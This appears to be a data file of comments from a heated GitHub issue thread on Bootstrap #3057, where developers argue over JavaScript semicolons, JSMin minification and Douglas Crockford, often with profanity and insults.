bootstrap/twbs/3057/5141814,"@friend .. you have made me feel clean!  I use ;'s as separaters and {}'s only for multi-line blocks, not single line blocks.  I've come out of the closet! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141843,"@friend wow, that's a great shed haha ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142140,"Why on earth is this discussion even happening? JSMin is a specific program that performs a task. It has a contract with the user. It gets an input (your js) and produces an output (minified js), following some rules. Nobody (AFAIK) said this is going to work perfectly with any possible valid JS code. @friend said (..) Stupid code or not, this is a broken minifier, because it's not adhering to the contract it claims to. Let's see... Is it really broken? What contract does it claim to adhere to? Please read  (And/or any other documentation I might not be aware of). Pay attention to the ""Caution"" section. It's not explicit, but give you the heads up not any random code will work... you have to watch out for some special situations. Valid JS code might fail when being processed through JSMin. This situation is kinda the same. It doesn't matter whether ommiting that semicolon is a stupid decision. That's irrelevant in this discussion, imo. What I think DOES matter, is Perhaps JSMin should have better documentation about specific valid JS code that might break while minifying (maybe that piece of documentation exists, and I don't know it). ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142268,Github threads are becoming so epic we need like buttons now. plus one on the bike shed @friend ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142273,"@friend first of all we need ""unsubscribe"" option D ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142285,"@friend There's a ""disable notifications for this issue"" link at the bottom. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142301,"@friend but they still appear in the top right corner forever. Or maybe Github fixed that, will see once someone posts a reply ;) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142834,wtb namespace keyword and a bunch of inane reasons why this is somehow torvalds' fault ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5142967,"@friend ""I heard semicolons killed @friend 's family"". My deepest condolences. I can totally understand his fight against semicolons than! -1 semicolons ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5143531,"@friend could take the high ground, add the semicolon until JSMin is fixed and have his pissing contest off in the corner while the rest of us get shit done. But being practical doesn't pump your ego quite like religious posturing does. Trolls gon' troll. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5143647,"@friend thanks, missed this in the sea of comments. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5143654,"@friend props to you on the maturity in the face of stuff like ""insanely stupid code"" and the flames that seems to have cued. Thank you for work. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5144868,"From JavaScriptMinifier, ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5144888,"@friend plus one Semicolons -1 If the damn language allows it, so be it.  Best practices == Cleanest Code. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5144910,@friend sorry... Best practices === Cleanest Code &lt;/trolling&gt; ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5145568,"After reading this I feel like I don't want to use semicolons. If you can't read code without semicolons, you shouldn't be coding in the first place... If minifier breaks the code because it doesn't agree with not using semicolons, f*ck that minifier, it's obviously broken, get a minifier that actually does what it's supposed to do. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5145585,"Do we need this amount of traffic over this issue? We can debate the syntax conventions all day, but no code munger should break functional code.  Period. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5146239,"""Functional"" code, valid syntax So you think we should write code like these just because it has a valid syntax? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5147222,"No, I don't think anybody should be writing code with sloppy, ignorant, or obfuscated syntax.  Hell, I reformat open-source code so braces line up and if statements are properly enclosed in braces and so forth. But the fact remains If the language compiler accepts it, then it should still compile after any preprocessing.  It may suck stylistically, but take that up with the language author. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5147721,"Guys, more background from 'Fat' on why he doesn't use semicolons written back in October 31st 2011  the use of '&amp;&amp;' instead of an 'if' statement ""If you were really having fun with it you could lose the if all together... Each is perfectly valid. Each behaves the same. It’s just a matter of preference and finding the style that makes most sense to you."" JSLint is described as a ""unnecessarily strict linter"". ""The majority of lines however don’t end with semicolons because they simply aren’t necessary and I prefer the minimalist aesthetic. For me, \n character is enough and the semicolon character is redundant."" ... IMHO Don't be a JavaScript hipster. Add semi-colons. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5147859,LOL -- This has made me giggle ) Use Dart if you dont like JS P Google wont complain....... ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5148030,"Javascript is neither pyhton nor ruby.. Learn to use semicolons, actually learn language you use properly. I can't understand why everybody is talking about semicolon everywhere. Before starting to code, learn language.. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5150193,Mikeal wrote a very good post about - why no semicolons - and I agree 100% ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5150273,"Wow, wasn't much more simple to just click the Merge button and add the fucking semicolon? So much wasted time.... ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5150869,@friend Some people take the way of the least resistance ( click Merge button ) and some stand for there beliefs @friend. I like people that stand for there beliefs. (And fyi @friend changed the code 2 days ago to a way that that doesn't fail in jsmin - the discussion is more general about ;+ oder ;- ) ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5152554,"@friend - Thanks, but while that Mikeal post starts out promisingly enough, it sort of trails off without really going anywhere. It's really off-topic, but I do think it's perfectly reasonable not to use semicolons in JS where the implied statement termination is obvious; unfortunately, the ASI rules make it ""obvious"" in cases where there actually isn't one inserted.  IM(ESH)O, the character after the newline shouldn't play any part in whether or not the newline is treated as a statement separator.   But since it does, you get surprises like this one. So I'd rather see more ""extra"" semicolons in the interest of readability, just as I like to see ""extra"" parentheses in many cases where the precedence rules don't require them. Regardless, I'm glad that both @friend and @friend have modified their respective codebases in the direction of greater interoperability. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5153438,"Someone please correct me if I am wrong. Isn't writing codes that depends on the quirks of the language (because it is designed to be forgiving in some situation) is also akin to write codes that depends on the quirks of a browser (because well, it is also designed to be forgiving in a lot of cases)? Since the forgiving part may change in the future, because its well.... not the intention of the language (its just tries to accomodate omission on the coders part), it seems that to me we can also say the same thing for browsers. Different versions of browsers tend to have different quirks of dealing on being forgiving. What do anyone think of the parallels here? Is it a correct one to draw or is it nowhere near being right? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5154053,Just a short question Why JSMin? Why not UglifyJS? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5154945,Is writing JavaScript without semi-colons Web 3.0? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5155866,"You can learn java in one day, but you are not productive until you learn the library, and the java-isms. Perhaps Javascript is similar, with the exception that the Javascript-ism have changed over time, and there are different Javascript-isms depending on what Javascript culture. Theres more than one Javascript culture (maybe as much different ways to describe a object in Javascript). The minifier is from a C like culture, where "";"" is usefull to describe intend. And the Bootstraping.js library is from a Ruby culture where "";"" on the start helps avoid bugs. Perhaps I was wrong, and the author of bootstraping don't need to change his code. While the author of jsmin is free to either support this Ruby-ismised-Javascript or ignore it. Being all cool. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5155950,"Anybody else find all those ""you need to learn the language - use semicolons"" comments ironic? The fact is that ecmascript doesn't require semicolons. If you don't approve it, I'm afraid nobody really cares. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5156512,"The level of Asperger-fueled pedantry on display here makes me feel sick. Just shut up please, JavaScrHiptsters. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5156809,"[This is why automatic semicolon insertion sucks] ( it's a speech by Douglas Crockford, but he's right. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5157624,JavaScrHiptsters should take note at 03430 and seriously ask themselves the same question. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5159218,"@friend So writing non-working code relates to semicolons how? If you follow Crockford's guidelines to the dot, soon you can't take a dump without semicolons to tell you when to stop pushing - the man is fanatic about his semicolons. Like I said before, if you can't write valid javascript without semicolons you are doing it wrong. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5159398,"I'm impartial about how this ends up, but for the love of god @friend, please stop trying to get ""JavaScrHiptsters"" to catch on. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5159698,"@friend Actually I was just trolling. The Crockford video was quoted from the guy above. But could you be any more smug? Does it make you feel smart to tell people they're ""doing it wrong""? Your epenis must be enormous. @friend Yeah you're right. javaScrHiptsters use lower camel case. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5160174,"Refusing to use optional syntax is a perfectly valid position to hold. Insisting upon always using the optional syntax is also perfectly valid. Unfortunately, picking one or the other (arbitrarily, I might add) and arguing incessantly on the internet about it is neither valid nor pragmatic. &lt;img src="" /&gt; Please, stop shitting all over my activity feed. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5160265,but is it flogDeadHorse()  or flogDeadHorse();  ?!? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5160583,More like ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5160602,Resolved! All languages should be s-expressions. ) &gt; ; ;-) ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5160959,"@friend jsmin.c is insanely stupid code.  Seriously... action(1), action(2), action(3)?  Really? Sorry, but nobody should dumb down their code to play at Doug's level.  guy deserves serious code shaming.  Why do people even listen to him and his rants? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5163741,"@friend except console methods are expected to not have side effects. flogging will leave visible lacerations on skin, even tough horse skin ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5164539,@friend you can't be serious. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5164833,"@friend did you read his code? yes, i'm serious. Taking three (completely different) functions, mashing them into one function, where you pass an integer to control which function actually runs?!?  That is CS 101 noob shit. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5165834,@friend I'm guessing that you missed that cases in action() don't have breaks? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5165860,@friend your work here is done ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5166353,"@friend nope. quirks-things where never any standard. it's old non-standard-wild-grown-browser-specific stuff. Automatic Semicolon Insertion in contrast is not wild-grown at all. It's part of the official standard by intention and supported by every javascript-runtime in the same way. In the way that is specified in the spec. And as mikeal points out ""There is no error in your JavaScript that is being “corrected,” the AST generated from semicolon-less JavaScript is identical to its semicolon riddled counterpart. "" ""ASI is a basic part of the language, it’s not an amendment."" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167308,This is still going on?  We have to set up spam filters to dump this crap to the trash? KNOCK IT OFF. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167342,@friend there's a notification toggle at the bottom of the page. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167368,@friend you got it!!! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167375,"Thanks, but I don't see it on GitHub nor in the E-mails that are pummeling us. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167391,Look for this  With your eyes. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167594,"Tried that.  The eyes thing, I mean.  Then I licked the screen and didn't taste it.  Also tried Braille.  Nope.  Even checked the top of the page, to see if there was some confusion there.  Nope again. Junk filter implemented.  Thanks anyway. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5167949,P.S.  is now a thing. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168056,"@friend I did miss that. It does make it slightly better; so it's not completely stupid.  It is still insanely terrible code, just not stupid. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168578, collection of resources to write semicolon-free JavaScripts. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168612,"This'll probably get lost in the noise, but the problem isn't confined to Jsmin. My webminifer plugin (which can use Closure or YUI for minification), also suffered the problem. The resolution was to ensure that a semicolon always appears between each file that is appended to each other (I append all files of my project and then minify). My recommendation to the Bootstrap boys is to think about linting the code and avoid ambiguities. I love bootstrap, but the JS is not so intuitive. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168901,"@friend Berating someone much smarter than you might make you feel better but you're not impressing anyone nor are you changing the reality that you are a clueless, talentless hipster. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168930,"@friend I echoed back his exact words to him. As I suggest you echo your own to yourself as you berate someone you dont know. On Tue, Apr 17, 2012 at 207 AM, Trevr reply@friend.github.com wrote ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168990,"@friend Crockford hasn't had an intelligent thing to say about JavaScript for years, but he wrote an OK book once and he writes a couple bad tools now, and he sits on a committee famous for barely-mediocre output, so we should consider him an ""authority"". No, we should ignore his mediocre tools, and his belligerent reviews of a typo. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5168997,"@friend You were just trying to score geek cred by talking down someone who is clearly much smarter than you. He was accurate and to-the-point. It's kind of sad to see so many clueless hipsters like yourself masquerading as serious software developers and desperately trying to be taken seriously. Instead of acknowledging and improving upon what people like Crockford have built, you seem to prefer bikeshedding and picking apart trivial crap like this to make yourself feel relevant. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5169133,"@friend lol, did you really create a github account for the sole purpose of trolling this thread?  Well played. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5169140,@friend You really need to sort that face out. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5170439,"The question is, what do we lose if we ended this infinite argument and added a single character that would make thousands of developers happy? Bandwidth or pride? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5170957,"Haven't you javaScrHiptsters got anything better to do? How about writing some revolutionary, world-changing software? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5172804,"Or just use coffeescript instead of trying to make a fundamentally shit language look like the cool kid languages? Writing code like this is like a fat, red-headed kid putting gel in his hair to impress the ladies. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5172824,That is so racist. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5175842,"If Javascript didn't require semicolons, then it wouldn't be called ""Automatic Semicolon Insertion"". Just because you don't need to put it in your code prior to that code being interpreted doesn't mean that semicolons aren't added for you before the script is actually run. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176007,"@friend ""Are we adults or children?"" Are we painters or plumbers?  If all one cares about is how many holes the shit will go down, that's just a plumber. @friend The original code was a bug, and was changed, that isn't the issue.  The issue is whether a painter, working on his own art, on his own time, for his own enjoyment, has any reason to sacrifice anything (his aesthetic or ego or  anything else) to please a bunch of plumbers. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176375,Can someone please create an unofficial branch of this library.  The authors have done an excellent job of creating it but this is not the first time they have been overly opinionated about trivial stuff. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176417,"@friend I wouldn't give credit to such a weird (sick, even) analogy but I need to say that if a painter is causing problems that would require bunch of plumbers to solve, that painter is doing something terribly wrong. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176454,"I'm glad this was changed in 2.0.3. When I used Bootstrap in Django, the dropdown.js broke in compressor as well. I saw what was going on, understood why they did it but added semi-colons anyway because it was a bad decision to hoist a personal vendetta against Javascript onto those who use Bootstrap. I added the semi-colons myself. Not a great practice, forking the code like that. But whatever. I'm not afraid of semi-colons. Should be known, though, that this broke the Django compressor plugin as well. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176594,"@friend ""problems"", ""require"", and ""solve"" are value-judgement words that only the plumbers share.  The painter is not causing a problem for himself or other painters. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176928,"Wow, its amazing how somebody can put so much effort and work into something that makes the lives of developers easier.. Then the community hate him because he misses a semi colon. I agree the semicolon should be there, but wont somebody please think of the children!  ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5176955,"@friend this is one of the many points where your analogy fails as only a few painters would work with tools that have terrible glitches. Also, you cannot assume that a problem doesn't exist, when it's just not valid for yourself. Does ""works on my machine badge"" ring a bell? These problems should worry you especially when you consider that this is the project with the most followers on GitHub, taking huge contributions. Ignoring community would make sense in few cases (  ), especially when there is a clear conflict of interest for the main maintainers but I don't see that here. Fixing problems like this would also bring no maintainability burden, if they don't already reduce it. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5177887,"@friend ""only a few painters would work with tools that have terrible glitches"", again a value-judgement about painters that only plumbers share, because they value utility over everything else, so of course ""glitches"" are a deal-breaker.  Painters will literally paint with excrement if they feel like it... and every now and then they turn excrement like JavaScript into something amazing (remember the original Prototype.js? a work of art in its day... or underscore.js now) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5178081,"@friend so makers of Prototype.js, underscore.js and bootstrap value code beauty over utility? Well, you seem to know these people very well; I can't comment on that. However, you calling a programming language (which also happens to be the number one on GitHub, even though it doesn't need to be) ""excrement"" tells a lot about your ""painting skills"" =) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5178600,"@friend I never assigned motive to prototype or underscore, just my own judgement of their quality; they built something that pleases me from a language that doesn't. And, I think the bootstrap source speaks for itself here. Ad hominem much? Try making an argument next time. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5178601,"I don't think the author has much options. I mean, look at the code.  The lack of "";"" is everywhere.  The author could add a "";"" there, but down the line the code will break again, perhaps in other file, perhaps with a different minimizer making similar asumptions. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5179102,"@friend my whole point was you didn't have any arguments except some snobby attitude towards a programming language. Against someone just going further and declaring a language unpleasant and calling who embrace it ""plumbers"", what am I supposed to argue? Start categorizing you or calling names? Whatever. I just had to state my opinion on a project that I hold some interest and this is going out of control. Have fun with painting, plumbing or whatever your thing is. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5182474,Can someone at @friend please block @friend?  This user is a child getting off on trying to incite ill will. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5183406,"@friend you missed the point of the plumber analogy, it wasn't to judge plumbers (who are very smart and productive people, they just have different values). Let the painters paint, let the plumbers plumb. Interoperating with jsmin.c is worth $0 and no cents to a painter. But, it's value must be ""obvious"" to a plumber. But, it's wrong to call a painter insane or stupid because he doesn't care about the same things you do (that was the point of the echo, in case you missed that rhetorical point)...  thats the argument people who call others ""insane"" and ""stupid"" for having a different POV are just being belligerent and should be ignored, authority is irrelevant, and productivity a red herring. The most common corollary of authority is belligerence, not access to ""truth"" (or, ""the right way""). ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5184614,"To those who believe nothing positive came from this debate, I offer this. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5184959,"Oh for fuck sake stop rabbiting on!!! Sent from my Windows Phone  From Jesse Dailey Sent 2012-04-17 2017 To Gareth Bradley Subject Re [bootstrap] bootstrap-dropdown.js clearMenus() needs ; at the end (#3057) @friend you missed the point of the plumber analogy, it wasn't to judge plumbers (who are very smart and productive people, they just have different values). Let the painters paint, let the plumbers plumb. Interoperating with jsmin.c is worth $0 and no cents to a painter. But, it's value must be ""obvious"" to a plumber. But, it's wrong to call a painter insane or stupid because he doesn't care about the same things you do (that was the point of the echo, in case you missed that rhetorical point)...  thats the argument people who call others ""insane"" and ""stupid"" for having a different POV are just being belligerent and should be ignored, authority is irrelevant, and productivity a red herring. The most common corollary of authority is belligerence, not access to ""truth"" (or, ""the right way"").  Reply to this email directly or view it on GitHub ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5185815,"For maximum safety, use the  module in npm.  When you , they are required. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5186463,"@friend you better don't judge them, I just didn't like that you tried to categorize people. You just can't, the people in the JavaScript community are just too diverse. You called a tool, which a lot of people love to work with, an ""excrement"". How do you decide that ""interoperating with jsmin.c is worth $0 and no cents to a painter""? I never defended anyone calling others names. Maybe they know each other and they are close enough to be able to say those things; who knows. However most of the people here are just trying to break a resistance which they see (or think) is unnecessary. They are not just ""painters"", ""plumbers"" or ""hipsters"". They are just making valid arguments to make a change in a project in which they have some interest or even contribution, perhaps. If you think that code beauty is more important in this project which has the slogan ""designed for everyone, everywhere"" and mainly used as a quick boilerplate for websites, I can only agree to disagree. It is not a war on semicolons. It's about making this project work ""everywhere"" as the slogan states. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5187199,"For those responding to @friend, especially with the ""Crockford is smarter than you"" type stuff, please scroll all the way back and see where this tone (""insanely stupid code"") was set. Additionally, I don't see the problem with the painter vs plumber analogy. Plumber is clearly not being used in a derogatory sense, unless you think @friend means Van Gogh when he says ""painter"". FWIW, I may be a minority of one here for I think the semicolon is a good idea because of aesthetic reasons! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5187575,"@friend you might want to check out under which organization account this repo is hosted. If you provide a software for people to use, then you should listen to them and adopt their needs. On the other hand, you are right about the forking part. Just fork the repo and use it as you see fit. But this is not gonna change the fact that omitting semicolons is a bad practice. On the other hand, you might wanna watch this part of this video ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5188065,"@friend Of course no individual is ever a perfect instance of a class.  That doesnt mean you can't talk about classes of people and the things that make them more similar to each other than they are to others.  It is naive to think otherwise, and it's a strawman to assert that I believe it (and possibly you were offended by a thought you only assumed I had). ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5189242,The un-official fork of Bootstrap for all your semicolon needs  pull requests at your convenience! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5191244,I came here to say this; ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5201733,"Why would anyone want to take away Zoidberg's eyes? ♠(V) (;,,;) (V)` ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5202002,"plus one to @friend for ""That is insanely stupid code."" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5203419,plus one to @friend for plus oneing @friend's beautiful words. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5204074,"Some PHP... this output Actually, nobody on the PHP community write code like that.  Because all PHP programmers know better... ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5206579,"This comment thread is long and pointless enough to be worthy of Reddit. On the other hand, if it keeps going, this dramatic story of semi-colons could be novelized and eventually turned into box office gold. Hmm... no time to start like the present...  Jacob Thornton leaned back in his chair, folding his hands behind his head. He was left with another free afternoon in the offices of Twitter from all the time saved in not inserting unnecessary semi-colons. Yes, life was beautiful. Suddenly, Douglas Crockford stormed into his office, red-faced and sweating. ""You asshole!"" shouted Doug. Jacob sat up quickly and jolted the desk, nearly toppling his mocha frappuccino. Doug continued his tirade ""What's this lack of semi-colon shit that broke JSMin? It's insanely stupid code. Learn to write JavaScript properly or I will fucking end you."" ... (to be continued) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5206719,@friend We need illustrators for that memorable story. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5206834,"Over 200 comments over a missing semicolon?? For fuck's sake people, don't you have any work to do?! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5206957,"@friend That's a good idea. Got ideas for some? In the meantime, I've moved the story here  I have since extended this scene and I expect David Fincher to call any second with a movie deal. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5207028,Who could have guessed that missing semicolons would lead to the creation of Thornton/Crockford slash fiction? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5207464,@friend apparently you don't have one either. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5208361,"plus one on @friend suggestion -- definitely the comic route is the way to go. Who knows, perhaps there shall be a SuperColon... no wait... @friend congratulations on the 201st comment. And it's not even 501 yet. -) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5210311,@friend .. just consider /. maybe we can be as OT and pointless! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5237433,"While I myself don't care so much either way about semicolons (whatever performs fastest is best IMHO), I imagine someone can write a tool to + or - ; to their preference.  I also find it ironic that the pro-; is on GitHub Do your best to never use a semicolon. This means avoiding them at line breaks and avoiding multi-statement lines.  ""Style Guides"" are just that; guides. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5239174,Be careful with Semicolon-free! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5239225,"@friend that's a horrible reference and one should never look at that page. As @friend indicated, If Javascript didn't require semicolons, then it wouldn't be called ""Automatic Semicolon Insertion"". This sentence should end the discussion but apparently didn't . ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5251384,I need to teach some programmers JavaScript and make sure they are ready in 3 weeks. Should I explain them all the rules of ASI? Aren't we supposed to make our fellow developers' lives easier? Who do we code for really? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5253086,"Ok, just because it's Friday and this thread is so entertaining  ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5262215,Someone with power (@friend ?) needs to set things in motion to make semicolons required in the spec. QED ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5262227,@friend Do you know what QED means? Making semicolons required in the spec would be a web-breaking change.  TC-39 will never do that. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5262246,"@friend right, then all of the people's code will break. Changing something drastically would be the same as stabbing someone as @friend said. That's why they cannot do that. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5262264,@friend this argument is the best reason to add semicolons to the spec. QED — as was demonstrated by this argument. A couple regex replacements could fix pretty much all of that. Wasting time on dumb little disagreements is the real web-breaking problem. ■ ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5262380,"@friend HAHAHAHa, dumb disagreements are web-breaking, that's what the web is FOR. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5263522,yet we consider ourselves engineers... / ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5263618,"""You cannot make progress without making decisions."" -- Jim Rohn ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5265650,"If the reason for not including a semicolon was aesthetics, then one wouldn't do something like this Those dangling commas, in the middle of nowhere, really do look bad. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5329618,If you're still reading this.. you really should go out and PLAY! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5353234,damn these notifications I've been getting lol! #PLAY ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5454582,"Mr. Madison, what you've just said is one of the most insanely idiotic things I have ever heard. At no point in your rambling, incoherent response were you even close to anything that could be considered a rational thought. Everyone in this room is now dumber for having listened to it. I award you no points, and may God have mercy on your soul. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5465211,"Seeing how @friend responded to this reminds me of how dumb it would be to use a library maintained by someone who doesn't value quality and reason, but makes decisions merely 'because they feel like it'. Pretty things built on a poor foundation aren't worth much to me. This is a great way to prune your user base. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5466944,The drama of this Github thread has now been forever immortalized. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5467930,@friend Read the story with pleasure ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5468540,This thread can be summarized in two images Crockford   Fat   ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5496479,"Ugly code that works &gt; nice looking code that doesn't work. Stop being a dick and put a god damn semicolon already, it's the best practice anyway. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5496845,"oh zing, this is now on reddit ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5497186,"Yep, congrats, you guys are now famous. Twitter devs fighting over a semicolon in a code that apparently isn't broken is pretty hilarious. You should probably finish off this disussion before (and if) Twitter's shares goes public on the stock market. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5675855,only geeks can fight over something like this. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5686470,"FTFY Only greeks can fight over something like this. ""You will go you will return not in the battle you will perish"" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5865916,"Someone should just create a library that can semi-colon-ify the semi-colon free code, then we could use lint, and minifiers without extra work. And, no standards need broken, and this code can be considered valid. Much the same as having a opinion on whether brackets go on the same, or next line, or the method of indentation (# spaces, or tabs, etc...) I personally use semicolons, 2 or 4 spaces for indenting, and keep my brackets on the same line. I don't see any reason to crucify fat for his style of code, and I also don't see why douglascrockford needs to have JSMin parse this kind of code. At this moment, JSMin not parsing the code is not a bug, but a choice. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5875007,They did.  Its called CoffeeScript ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5877823,What we need is more fat / crockford fan fiction. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5922761,Can you please just add semicolons? By omitting them you are causing me and my team a big headache. Thanks! ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5931714,"@ scryptonite ""whether brackets go on the same, or next line"" Ask crockford about that one also! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6214808,I missed parts of this. What did we all agree on in the end? ,False,True,False,bootstrap/twbs/3057
